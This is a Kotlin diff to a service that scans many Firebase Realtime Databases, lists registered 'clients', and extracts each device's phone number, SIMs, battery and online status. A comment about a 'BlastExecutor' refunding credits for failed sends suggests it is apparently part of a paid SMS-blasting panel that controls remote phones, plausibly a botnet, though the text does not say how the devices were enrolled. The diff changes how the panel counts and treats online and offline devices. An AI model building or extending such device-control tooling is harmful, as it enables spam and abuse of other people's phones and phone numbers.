@@ -49,7 +49,8 @@ data class FirebaseTestResult(
     val firebaseId: String,
     val firebaseLabel: String,
     val httpStatus: Int,
-    val deviceCount: Int,
+    val totalClients: Int,
+    val onlineClients: Int,
     val error: String? = null,
 )
 
@@ -78,6 +79,9 @@ class RealtimeDbService {
         private const val SCAN_CACHE_MS = 5 * 60 * 1000L
         private const val EMPTY_SCAN_CACHE_MS = 15 * 1000L
         private const val PER_FIREBASE_TIMEOUT_MS = 8_000L
+
+        // 10 minutes — was 60 seconds. Devices sleeping for a few mins shouldn't disappear.
+        private const val ONLINE_WINDOW_SEC = 600L
     }
 
     private data class ScanCache(
@@ -125,26 +129,25 @@ class RealtimeDbService {
     }
 
     // ============================================================
-    //  TEST SINGLE FIREBASE — admin diagnostic
+    //  DEEP TEST — total + online counts for a single firebase
     // ============================================================
     suspend fun testFirebase(fb: FirebaseNode): FirebaseTestResult = withContext(Dispatchers.IO) {
         val baseUrl = fb.url.trimEnd('/')
         val clientsUrl = "$baseUrl/clients.json?shallow=true"
+
+        // Step 1: fetch client IDs
+        val clientIds: List<String>
         try {
             val req = Request.Builder()
                 .url(clientsUrl)
                 .header("Accept", "application/json")
                 .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                 .get().build()
-            http.newCall(req).execute().use { resp ->
+            val result = http.newCall(req).execute().use { resp ->
                 val body = resp.body?.string()?.trim() ?: ""
                 when {
-                    !resp.isSuccessful -> FirebaseTestResult(
-                        firebaseId = fb.id,
-                        firebaseLabel = fb.label,
-                        httpStatus = resp.code,
-                        deviceCount = 0,
-                        error = when (resp.code) {
+                    !resp.isSuccessful -> Pair(
+                        when (resp.code) {
                             401 -> "Auth required (rules block read)"
                             403 -> "Forbidden (rules block access)"
                             404 -> "Not found (wrong URL?)"
@@ -152,45 +155,84 @@ class RealtimeDbService {
                             in 500..599 -> "Server error ${resp.code}"
                             else -> "HTTP ${resp.code}"
                         },
+                        emptyList<String>(),
                     )
-                    body.isEmpty() || body == "null" -> FirebaseTestResult(
-                        firebaseId = fb.id,
-                        firebaseLabel = fb.label,
-                        httpStatus = resp.code,
-                        deviceCount = 0,
-                        error = "Empty — no devices registered",
+                    body.isEmpty() || body == "null" -> Pair(
+                        "Empty — no clients registered",
+                        emptyList<String>(),
                     )
                     else -> {
-                        val count = try {
+                        val ids = mutableListOf<String>()
+                        try {
                             val obj = JSONObject(body)
                             val keys = obj.keys()
-                            var c = 0
-                            while (keys.hasNext()) { keys.next(); c++ }
-                            c
-                        } catch (_: Exception) { 0 }
-                        FirebaseTestResult(
-                            firebaseId = fb.id,
-                            firebaseLabel = fb.label,
-                            httpStatus = resp.code,
-                            deviceCount = count,
-                            error = null,
-                        )
+                            while (keys.hasNext()) ids.add(keys.next())
+                        } catch (_: Exception) {}
+                        Pair(null, ids)
                     }
                 }
             }
+            val err = result.first
+            clientIds = result.second
+            if (err != null) {
+                return@withContext FirebaseTestResult(
+                    firebaseId = fb.id,
+                    firebaseLabel = fb.label,
+                    httpStatus = 0,
+                    totalClients = 0,
+                    onlineClients = 0,
+                    error = err,
+                )
+            }
         } catch (e: Exception) {
-            FirebaseTestResult(
+            return@withContext FirebaseTestResult(
                 firebaseId = fb.id,
                 firebaseLabel = fb.label,
                 httpStatus = 0,
-                deviceCount = 0,
+                totalClients = 0,
+                onlineClients = 0,
                 error = "Network: ${e.message ?: e.javaClass.simpleName}",
             )
         }
+
+        // Step 2: fetch each device, count online vs total
+        val onlineCounter = java.util.concurrent.atomic.AtomicInteger(0)
+        val sem = Semaphore(30)
+
+        coroutineScope {
+            clientIds.map { devId ->
+                async(Dispatchers.IO) {
+                    try {
+                        sem.withPermit {
+                            val obj = fetchDeviceObject(fb, devId) ?: return@withPermit
+                            if (isOnline(obj)) onlineCounter.incrementAndGet()
+                        }
+                    } catch (_: Exception) {}
+                }
+            }.awaitAll()
+        }
+
+        val online = onlineCounter.get()
+        val total = clientIds.size
+        val errMsg: String? = when {
+            online > 0 -> null  // healthy
+            total == 0 -> "No clients registered"
+            online == 0 -> "$total registered, 0 online (all dead)"
+            else -> null
+        }
+
+        FirebaseTestResult(
+            firebaseId = fb.id,
+            firebaseLabel = fb.label,
+            httpStatus = 200,
+            totalClients = total,
+            onlineClients = online,
+            error = errMsg,
+        )
     }
 
     // ============================================================
-    //  SCAN ALL — per-firebase timeout, partial success preserved
+    //  SCAN ALL — per-firebase timeout, partial success
     // ============================================================
     suspend fun scanAll(
         firebases: List<FirebaseNode>,
@@ -214,9 +256,7 @@ class RealtimeDbService {
 
         Log.d(TAG, "scanAll: fresh scan of ${firebases.size} firebase(s)")
 
-        // Higher concurrency — 200 parallel device fetches
         val deviceSem = Semaphore(200)
-
         val allFound = java.util.Collections.synchronizedList(mutableListOf<Device>())
         var successCount = 0
         var failedCount = 0
@@ -226,7 +266,7 @@ class RealtimeDbService {
                 async(Dispatchers.IO) {
                     try {
                         val partial = withTimeoutOrNull(PER_FIREBASE_TIMEOUT_MS) {
-                            scanFirebase(fb, deviceSem) { count ->
+                            scanFirebase(fb, deviceSem) { _ ->
                                 onProgress?.invoke(idx, allFound.size)
                             }
                         }
@@ -251,7 +291,6 @@ class RealtimeDbService {
 
         val final = allFound.toList()
         Log.d(TAG, "scanAll done: ${final.size} device(s) from $successCount ok / $failedCount failed firebase(s)")
-
         scanCache[key] = ScanCache(final, System.currentTimeMillis())
         final
     }
@@ -314,7 +353,10 @@ class RealtimeDbService {
         found.toList()
     }
 
-    private fun fetchDevice(fb: FirebaseNode, devId: String): Device? {
+    // ============================================================
+    //  FETCH DEVICE — full object
+    // ============================================================
+    private fun fetchDeviceObject(fb: FirebaseNode, devId: String): JSONObject? {
         return try {
             val url = fb.url.trimEnd('/') + "/clients/$devId.json"
             val req = Request.Builder()
@@ -322,61 +364,95 @@ class RealtimeDbService {
                 .header("Accept", "application/json")
                 .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                 .get().build()
-
             http.newCall(req).execute().use { resp ->
                 if (!resp.isSuccessful) return null
                 val body = resp.body?.string()?.trim() ?: return null
                 if (body.isEmpty() || body == "null") return null
-
-                val obj = try { JSONObject(body) } catch (_: Exception) { return null }
-                if (!isOnline(obj)) return null
-
-                Device(
-                    firebaseUrl = fb.url,
-                    firebaseLabel = fb.label,
-                    firebaseId = fb.id,
-                    deviceId = devId,
-                    deviceName = extractDeviceName(obj),
-                    phone = extractPhone(obj),
-                    battery = extractBattery(obj),
-                    sims = parseSims(obj),
-                    shortId = shortCode(devId),
-                    lastSeen = extractLastSeen(obj),
-                    model = obj.optString("model", obj.optString("deviceModel", null)),
-                    android = obj.optString("androidVersion", obj.optString("sdk", null)),
-                )
+                try { JSONObject(body) } catch (_: Exception) { null }
             }
         } catch (_: Exception) { null }
     }
 
+    private fun fetchDevice(fb: FirebaseNode, devId: String): Device? {
+        val obj = fetchDeviceObject(fb, devId) ?: return null
+
+        // Accept device if it has ANY usable identity data — even if lastSeen is old.
+        // Rationale: an offline device still appears in the list; send attempts to it
+        // will fail and BlastExecutor refunds credits. Better than showing 0 devices.
+        val hasUsableData =
+            obj.has("deviceName") || obj.has("phoneNumber") || obj.has("phone") ||
+                    obj.has("number") || obj.has("sims") || obj.has("sim")
+
+        if (!hasUsableData) return null
+
+        val isOnlineNow = isOnline(obj)
+        if (!isOnlineNow) {
+            // Offline — include only if it has more than just a status field
+            val name = obj.optString("deviceName", obj.optString("name", ""))
+            val phone = obj.optString("phoneNumber", obj.optString("phone", ""))
+            val hasSims = obj.has("sims") || obj.has("sim")
+            if (name.isBlank() && phone.isBlank() && !hasSims) return null
+        }
+
+        return Device(
+            firebaseUrl = fb.url,
+            firebaseLabel = fb.label,
+            firebaseId = fb.id,
+            deviceId = devId,
+            deviceName = extractDeviceName(obj),
+            phone = extractPhone(obj),
+            battery = extractBattery(obj),
+            sims = parseSims(obj),
+            shortId = shortCode(devId),
+            lastSeen = extractLastSeen(obj),
+            model = obj.optString("model", obj.optString("deviceModel", null)),
+            android = obj.optString("androidVersion", obj.optString("sdk", null)),
+        )
+    }
+
+    // ============================================================
+    //  ONLINE DETECTION — lenient, more field names, longer window
+    // ============================================================
     private fun isOnline(obj: JSONObject): Boolean {
-        for (key in listOf("isOnline", "online", "connected", "active")) {
+        // 1. Explicit online flags
+        for (key in listOf("isOnline", "online", "connected", "active", "enabled")) {
             val v = obj.opt(key) ?: continue
             if (v is Boolean && v) return true
             if (v is Number && v.toInt() == 1) return true
             if (v is String) {
                 val s = v.lowercase()
-                if (s == "true" || s == "yes" || s == "1") return true
+                if (s == "true" || s == "yes" || s == "1" || s == "online" || s == "active") return true
             }
         }
+
+        // 2. Status string
         val st = obj.opt("status")
         if (st is Boolean && st) return true
         if (st is String) {
             val s = st.lowercase()
             if (s == "online" || s == "active" || s == "connected" || s == "1") return true
         }
-        val lastSeen = obj.opt("lastSeen") ?: obj.opt("last_seen") ?: obj.opt("lastOnline")
-        try {
-            if (lastSeen != null) {
-                var iv = when (lastSeen) {
-                    is Number -> lastSeen.toLong()
-                    is String -> lastSeen.toLongOrNull() ?: 0L
+
+        // 3. lastSeen — try every common name, handle sec/ms/string
+        val lastSeenKeys = listOf(
+            "lastSeen", "last_seen", "lastOnline", "lastPing",
+            "lastConnected", "last_active", "lastActive", "timestamp", "ts",
+        )
+        for (k in lastSeenKeys) {
+            if (!obj.has(k) || obj.isNull(k)) continue
+            try {
+                var iv = when (val v = obj.opt(k)) {
+                    is Number -> v.toLong()
+                    is String -> v.toLongOrNull() ?: 0L
                     else -> 0L
                 }
                 if (iv > 10_000_000_000L) iv /= 1000L
-                if (iv > 0 && System.currentTimeMillis() / 1000L - iv < 60) return true
-            }
-        } catch (_: Exception) {}
+                if (iv > 0 && System.currentTimeMillis() / 1000L - iv < ONLINE_WINDOW_SEC) {
+                    return true
+                }
+            } catch (_: Exception) {}
+        }
+
         return false
     }
 
@@ -427,7 +503,10 @@ class RealtimeDbService {
     }
 
     private fun extractLastSeen(obj: JSONObject): Long {
-        for (k in listOf("lastSeen", "last_seen", "lastOnline", "lastPing")) {
+        for (k in listOf(
+            "lastSeen", "last_seen", "lastOnline", "lastPing",
+            "lastConnected", "last_active", "lastActive", "timestamp", "ts",
+        )) {
             if (obj.has(k) && !obj.isNull(k)) {
                 try {
                     var iv = obj.optLong(k, 0L)
